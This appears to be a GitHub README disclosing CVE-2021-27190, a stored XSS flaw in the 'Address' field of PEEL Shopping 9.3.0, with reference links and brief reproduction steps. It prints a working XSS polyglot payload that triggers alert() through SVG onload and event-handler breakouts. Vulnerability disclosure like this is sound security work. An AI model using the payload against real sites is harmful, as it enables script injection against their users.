# CVE-2021-27190 - PEEL Shopping, eCommerce shopping cart - Stored Cross-Site Scripting Vulnerability in 'Address'

[![Watch the video](https://i.imgur.com/UsFUHok.png)](https://drive.google.com/file/d/1t1hksDsYqYsqryRq61tNIQQMTCFidtc1/view)


## Date

2021-02-11 <br />

## Exploit Author
Anmol K Sachan <br />

## Vendor Homepage
https://www.peel.fr/ <br />

## Software Link
https://www.peel.fr/nos-offres-1/peel-shopping-31.html <br />
https://sourceforge.net/projects/peel-shopping/ <br />

## Vulnerable Software Link
https://drive.google.com/file/d/1dIwRdaqtEyqUUgxbRqrHiS5WQ10nEG8z/view?usp=sharing <br />

## Software: : 
PEEL SHOPPING 9.3.0 <br />

## Vulnerability Type
Stored Cross-site Scripting <br />

## Vulnerability
Stored XSS <br />

## Tested on Windows 10 XAMPP 
<br />

## CVE Assigned 
CVE-2021-27190 <br />
This application is vulnerable to Stored XSS vulnerability. <br />

## Vulnerable script
http://localhost/peel-shopping_9_3_0/utilisateurs/change_params.php <br />

https://github.com/anmolksachan/CVE-2021-27190-PEEL-Shopping-cart-9.3.0-Stored-XSS/edit/main/README.MD## Vulnerable parameters
'Address' <br />

## Payload used <br />
```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e``` 
<br /> 
## POC
https://drive.google.com/file/d/1t1hksDsYqYsqryRq61tNIQQMTCFidtc1/view <br />
In the same page where we injected payload click on the text box to edit the address. <br />
You will see your Javascript code (XSS) executed. <br />

## Referneces
1. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-27190<br />
2. https://packetstormsecurity.com/files/161367/PEEL-Shopping-9.3.0-Cross-Site-Scripting.html<br />
3. https://www.exploit-db.com/exploits/49553<br />
4. https://www.secuneus.com/cve-2021-27190-peel-shopping-ecommerce-shopping-cart-stored-cross-site-scripting-vulnerability-in-address/<br />
5. https://cxsecurity.com/issue/WLB-2021020054<br />
6. https://nvd.nist.gov/vuln/detail/CVE-2021-27190


